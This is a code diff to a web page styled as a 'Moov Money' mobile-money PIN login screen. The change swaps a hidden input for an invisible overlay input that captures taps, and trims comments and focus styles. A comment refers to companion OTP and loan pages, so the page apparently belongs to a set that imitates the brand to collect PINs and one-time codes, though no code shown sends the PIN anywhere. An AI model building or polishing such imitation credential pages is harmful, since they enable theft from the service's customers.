@@ -32,7 +32,7 @@
       box-shadow: 0 0 20px rgba(0,0,0,0.05);
     }
 
-    /* ── top bar (same as OTP/loan pages) ── */
+    /* ── top bar ── */
     .top-bar {
       height: 95px;
       background: #f57c00;
@@ -54,7 +54,7 @@
 
     /* ── container ── */
     .container {
-      padding: 18px 28px 100px; /* bottom padding for fixed button */
+      padding: 18px 28px 100px;
     }
 
     /* ── logo ── */
@@ -100,14 +100,16 @@
       margin-bottom: 28px;
     }
 
-    /* ── PIN boxes ── */
+    /* ── PIN boxes wrapper (relative for overlay) ── */
     .pin-box-wrapper {
       background: #fafafa;
       border-radius: 18px;
       padding: 22px 16px;
       margin-bottom: 28px;
       border: 1px solid #eee;
+      position: relative;   /* needed for absolute overlay */
       cursor: pointer;
+      touch-action: manipulation;
     }
 
     .pin-row {
@@ -136,11 +138,6 @@
       box-shadow: 0 0 0 2px rgba(154,0,0,0.1);
     }
 
-    .pin-box:focus-within {
-      border-color: #1976d2;
-      box-shadow: 0 0 0 2px rgba(25, 118, 210, 0.15);
-    }
-
     .lock-icon {
       width: 56px;
       height: 56px;
@@ -152,6 +149,22 @@
       justify-content: center;
       font-size: 24px;
       color: #aaa;
+    }
+
+    /* ── overlay input ── */
+    #pinInput {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      pointer-events: auto;   /* captures all clicks/taps */
+      background: transparent;
+      border: none;
+      outline: none;
+      cursor: pointer;
+      font-size: 16px;        /* just to keep it valid */
     }
 
     /* ── alert message ── */
@@ -179,7 +192,7 @@
       border: 1px solid #b7d7b7;
     }
 
-    /* ── continue button (fixed) ── */
+    /* ── button (fixed) ── */
     .continue-btn {
       position: fixed;
       left: 28px;
@@ -235,12 +248,6 @@
       border: 1px solid #ffd54f;
     }
 
-    /* ── back link (hidden; we use top bar) ── */
-    .back-link {
-      display: none;
-    }
-
-    /* ── footer ── */
     .footer {
       margin-top: 24px;
       text-align: center;
@@ -250,13 +257,8 @@
       padding-bottom: 12px;
     }
 
-    /* ── hidden input ── */
-    .hidden-input {
-      position: absolute;
-      opacity: 0;
-      pointer-events: none;
-      width: 1px;
-      height: 1px;
+    .back-link {
+      display: none;
     }
   </style>
 </head>
@@ -264,13 +266,12 @@
 
 <div class="app-wrapper">
 
-  <!-- Top bar with back arrow -->
+  <!-- Top bar -->
   <div class="top-bar">
     <button class="back-btn" onclick="window.history.back()">&#8592;</button>
   </div>
 
   <div class="container">
-    <!-- Logo -->
     <div class="logo">
       <div class="logo-circle">M</div>
       <div class="moov-text">Moov Money</div>
@@ -279,7 +280,8 @@
     <div class="title">Code PIN</div>
     <div class="subtitle">Entrez votre code PIN à 4 chiffres</div>
 
-    <div class="pin-box-wrapper" onclick="focusPin()">
+    <!-- PIN boxes with invisible input overlay -->
+    <div class="pin-box-wrapper">
       <div class="pin-row">
         <div class="pin-box" id="b1"></div>
         <div class="pin-box" id="b2"></div>
@@ -287,6 +289,8 @@
         <div class="pin-box" id="b4"></div>
         <div class="lock-icon">🔒</div>
       </div>
+      <!-- Overlay input -->
+      <input id="pinInput" type="tel" inputmode="numeric" maxlength="4" autofocus />
     </div>
 
     <div id="otp-alert"></div>
@@ -295,11 +299,9 @@
     <div class="footer">v 5.3.2 (1.0.0)</div>
   </div>
 
-  <!-- Continue button (fixed) -->
+  <!-- Fixed button -->
   <button id="verifyBtn" class="continue-btn" disabled>Se connecter</button>
 </div>
-
-<input id="pinInput" class="hidden-input" type="tel" inputmode="numeric" maxlength="4" autofocus tabindex="0" />
 
 <script>
 (function() {
@@ -327,15 +329,8 @@
     return;
   }
 
-  // ── Focus helper ──
+  // ── Focus helper (called on load and after errors) ──
   function focusPin() { input.focus(); }
-
-  // Also focus on touch/click on the wrapper (already has onclick)
-  // Add a touchstart to ensure mobile keyboard appears
-  document.querySelector('.pin-box-wrapper').addEventListener('touchstart', function(e) {
-    e.preventDefault(); // prevent double-focus issues
-    input.focus();
-  });
 
   // ── Update PIN boxes ──
   function updateBoxes(value) {
@@ -438,8 +433,6 @@
 
   // ── Initial focus ──
   window.onload = () => focusPin();
-
-  // ── Ensure back button works (already has onclick) ──
 })();
 </script>
 
